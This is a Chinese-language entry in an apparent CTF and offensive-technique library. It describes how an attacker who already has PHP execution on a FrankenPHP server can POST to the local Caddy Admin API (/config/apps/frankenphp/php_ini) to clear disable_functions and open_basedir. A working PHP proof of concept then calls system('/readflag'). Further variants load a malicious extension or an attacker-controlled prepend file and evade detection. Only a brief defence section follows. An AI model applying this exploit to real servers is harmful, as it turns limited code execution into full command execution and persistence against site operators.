---
id: web-php-rce-frankenphp-php-ini-disable-functions-bypass
title: FrankenPHP php_ini 运行时注入：POST /config/apps/frankenphp/php_ini 清空 disable_functions/open_basedir
type: scenario
domain: web
path: web/php/rce
technique: frankenphp-php-ini-runtime-injection
aliases:
- FrankenPHP php_ini 注入
- Caddy Admin API 改 php.ini
- disable_functions 清空
- open_basedir 重置
- apps/frankenphp/php_ini
- 运行时 ini 修改
tags:
- php
- frankenphp
- caddy
- php-ini
- disable-functions
- open-basedir
- admin-api
- config-injection
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T13:44:47+08:00'
  notes: 已对照原文与图20-23核对：apps.frankenphp 的 php_ini 来自官方文档，POST /config/apps/frankenphp/php_ini 传 disable_functions=""/open_basedir="/" 后 ini_get 显示已清空，system('/readflag') 回显 flag，均与原文一致；未在本机复跑
---

## 一句话结论

FrankenPHP 把 PHP 的 `php_ini` 暴露为 Caddy 配置项；攻击者在取得 PHP 代码执行后，向本机 Caddy Admin API 的 `/config/apps/frankenphp/php_ini` POST `{"disable_functions":"","open_basedir":"/"}`，即可在运行时清空禁用函数与目录限制，随后直接 `system()` 执行命令读取 flag。

## 原理

- **php_ini 是 Caddy/FrankenPHP 配置的一部分**：FrankenPHP 的配置块支持 `php_ini <key> <value>`，Caddy 把整份配置以 JSON 形式暴露在 Admin API 的 `/config/` 下，FrankenPHP 应用对应 `apps.frankenphp`，其 `php_ini` 是一个键值映射。
- **Admin API 可在运行时应用配置**：Caddy 的 `/config/...` 端点支持 POST/PUT/PATCH；向 `apps.frankenphp.php_ini` 写入新键值会触发 FrankenPHP 重新加载 PHP 配置，新建的 PHP 线程/请求使用新的 ini 值，不需要重启进程。
- **disable_functions/open_basedir 属于 PHP_INI_SYSTEM**：普通 PHP 代码无法用 `ini_set()` 修改它们，但 SAPI/配置加载阶段可以设置；通过 Caddy 配置层修改绕过了这一限制。
- **利用前提是已有 PHP 代码执行**：攻击者需要能执行 PHP（如上传 WebShell、模板注入、文件包含），然后用 `file_get_contents` + `stream_context_create` 从 PHP 进程内部访问 `127.0.0.1:2019`；`curl_*` 被禁用不影响该路径。
- **效果**：`disable_functions` 置空后 `system/exec/popen` 等恢复可用；`open_basedir` 置 `/` 后可读写更多目录；随后可直接执行 `/readflag` 或反弹 Shell。
- **与 open_basedir 绕过的区别**：Caddy file_server 路线让 Caddy 读文件（PHP 仍受限）；php_ini 路线直接移除 PHP 限制，危害更大，但需要 Admin API 可写。

## 触发条件

- 目标为 FrankenPHP 部署，Caddy Admin API 默认 `127.0.0.1:2019` 且未关闭/未加认证。
- 攻击者已在 PHP 层取得代码执行，能调用 `file_get_contents`/`stream_context_create`。
- `apps.frankenphp` 配置存在且 `php_ini` 可写；Caddy 版本/FrankenPHP 模块支持运行时重载。
- `disable_functions`/`open_basedir` 是主要阻碍，且没有其它 PHP 层绕过可用。
- 目标存在需要执行的二进制（如 `/readflag`）或需要命令执行才能获取的 flag。

## 利用步骤

1. 通过上传/包含等方式获得 PHP 代码执行，确认 `file_get_contents('http://127.0.0.1:2019/config/')` 可读到 Caddy 配置。
2. 构造 JSON：`{"disable_functions":"","open_basedir":"/"}`；需要时同时清空 `disable_classes` 或设置 `auto_prepend_file`。
3. 用 `stream_context_create` 以 POST 方法、`Content-Type: application/json` 发送到 `http://127.0.0.1:2019/config/apps/frankenphp/php_ini`。
4. 用 `var_dump(ini_get('disable_functions')); var_dump(ini_get('open_basedir'));` 验证是否已清空。
5. 执行 `system('/readflag')` 或 `system('cat /flag')`，获取命令输出。
6. 若配置未生效，检查 `apps.frankenphp` 的实际结构、Caddy 日志，或改用 `PATCH`/`PUT` 覆盖整个 `php_ini` 对象。

## PoC

```php
<?php
$ini = [
    "disable_functions" => "",
    "open_basedir" => "/",
];

$ctx = stream_context_create([
    "http" => [
        "method" => "POST",
        "header" => "Content-Type: application/json\r\n",
        "content" => json_encode($ini),
        "ignore_errors" => true,
        "timeout" => 1,
    ],
]);

echo file_get_contents(
    "http://127.0.0.1:2019/config/apps/frankenphp/php_ini",
    false,
    $ctx
);

// 验证
var_dump(ini_get("disable_functions"));
var_dump(ini_get("open_basedir"));

// 执行
system("/readflag");
```

## 变体与关联

- 变体：设置 `auto_prepend_file` 指向攻击者控制的文件，使每个请求自动执行代码；或设置 `extension` 加载恶意 `.so`。
- 变体：清空 `disable_classes` 以恢复 `PDO`/`SQLite3` 等类；把 `open_basedir` 设为 `/app:/tmp` 等更精确的路径以降低被发现的概率。
- 变体：若 Admin API 只允许 GET，可尝试其它未授权的配置写入点或 Caddy 配置文件写权限。
- 关联：[[web-php-open-basedir-bypass-caddy-admin-api-file-server-read]]（同一 Admin API 的 file_server 任意文件读）、[[web-php-frankenphp-splitpos-unicode-casefold-path-differential]]（同一题的 PHP 执行入口）、[[web-php-rce-php7-backtrace-uaf-disable-functions-bypass]]（PHP 层 disable_functions 绕过）。

## 检测与防御

- 防御：Caddy 配置 `admin off` 或改为 Unix socket 并加认证；禁止 Web 应用用户访问 Admin API。
- 防御：把 `php_ini` 设为不可变配置或限制可写键；以低权限用户运行 Caddy/PHP，限制可读文件与命令执行。
- 检测：监控 `/config/apps/frankenphp/php_ini` 的 POST/PUT/PATCH；审计 `disable_functions`、`open_basedir`、`auto_prepend_file`、`extension` 等敏感键的变化；关注 PHP 进程向 2019 端口的请求。
- 说明：`disable_functions`/`open_basedir` 只是 PHP 层限制，不能防御同机管理接口被滥用；代码执行后应假设可修改运行时配置。
